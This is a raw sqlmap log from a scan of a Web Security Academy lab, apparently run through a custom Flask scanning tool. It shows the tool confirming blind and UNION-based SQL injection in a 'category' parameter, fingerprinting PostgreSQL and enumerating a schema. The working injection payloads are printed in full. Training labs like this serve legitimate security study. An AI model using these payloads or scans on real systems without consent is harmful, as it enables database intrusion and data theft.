--- SQLMap STDOUT for https://0ace00bb03b808e1804353c70061003e.web-security-academy.net/filter?category=Accessories ---
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.6#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:51:35 /2025-09-16/

[03:51:35] [INFO] parsing HTTP request from '/tmp/tmpk5lgfwml'
[03:51:36] [WARNING] using '/home/kali/Desktop/flask/app/scan/deep/sqlmap_scan_results/scan_5150879263647820225' as the output directory
[03:51:36] [INFO] testing connection to the target URL
[03:52:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:52:38] [INFO] testing if the target URL content is stable
[03:53:39] [INFO] target URL content is stable
[03:53:39] [INFO] testing if GET parameter 'category' is dynamic
[03:53:40] [INFO] GET parameter 'category' appears to be dynamic
[03:54:41] [WARNING] heuristic (basic) test shows that GET parameter 'category' might not be injectable
[03:54:42] [INFO] testing for SQL injection on GET parameter 'category'
[03:54:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:55:43] [WARNING] reflective value(s) found and filtering out
[03:56:45] [INFO] GET parameter 'category' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Six")
[04:08:08] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'PostgreSQL' 
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (3) and risk (1) values? [Y/n] Y
[04:08:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[04:09:09] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[04:10:11] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[04:10:11] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[04:10:11] [INFO] testing 'Generic inline queries'
[04:10:12] [INFO] testing 'PostgreSQL inline queries'
[04:11:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[04:11:13] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[04:11:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[04:12:25] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[04:12:27] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[04:13:29] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[04:13:30] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[04:14:31] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[04:14:37] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[04:15:14] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[04:15:50] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[04:15:55] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[04:15:57] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[04:15:59] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[04:16:00] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[04:16:03] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[04:16:03] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[04:16:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:16:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:16:05] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:16:08] [INFO] target URL appears to have 8 columns in query
[04:16:12] [INFO] GET parameter 'category' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[04:16:12] [WARNING] applying generic concatenation (CONCAT)
[04:16:13] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
GET parameter 'category' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=Accessories' AND 5863=5863-- NwqW

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: category=Accessories' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(106)||CHR(113)||CHR(112)||CHR(113))||(CHR(113)||CHR(82)||CHR(109)||CHR(99)||CHR(86)||CHR(65)||CHR(105)||CHR(88)||CHR(103)||CHR(90)||CHR(81)||CHR(90)||CHR(99)||CHR(85)||CHR(82)||CHR(71)||CHR(107)||CHR(105)||CHR(70)||CHR(90)||CHR(71)||CHR(121)||CHR(85)||CHR(101)||CHR(97)||CHR(108)||CHR(121)||CHR(70)||CHR(105)||CHR(108)||CHR(66)||CHR(86)||CHR(104)||CHR(107)||CHR(120)||CHR(105)||CHR(80)||CHR(105)||CHR(119)||CHR(120))||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)),NULL,NULL-- EUDZ
---
[04:16:13] [INFO] testing PostgreSQL
[04:16:14] [INFO] confirming PostgreSQL
[04:16:15] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[04:16:22] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
[04:16:22] [INFO] fetching database (schema) names
[04:16:24] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[04:16:26] [WARNING] the SQL query provided does not return any output
[04:16:26] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[04:16:26] [INFO] fetching number of databases
[04:16:26] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval

[04:16:26] [INFO] retrieved: 3

[04:16:32] [INFO] retrieved: [04:16:32] [WARNING] unexpected HTTP code '500' detected. Will use (extra) validation step in similar cases


[04:16:34] [INFO] retrieved: 

[04:16:36] [INFO] retrieved: 
[04:16:39] [INFO] falling back to current database
[04:16:39] [INFO] fetching current database
[04:16:40] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
available databases [1]:
[*] public

[04:16:40] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 51 times
[04:16:40] [INFO] fetched data logged to text files under '/home/kali/Desktop/flask/app/scan/deep/sqlmap_scan_results/scan_5150879263647820225/0ace00bb03b808e1804353c70061003e.web-security-academy.net'

[*] ending @ 04:16:40 /2025-09-16/


--- SQLMap STDERR for https://0ace00bb03b808e1804353c70061003e.web-security-academy.net/filter?category=Accessories ---
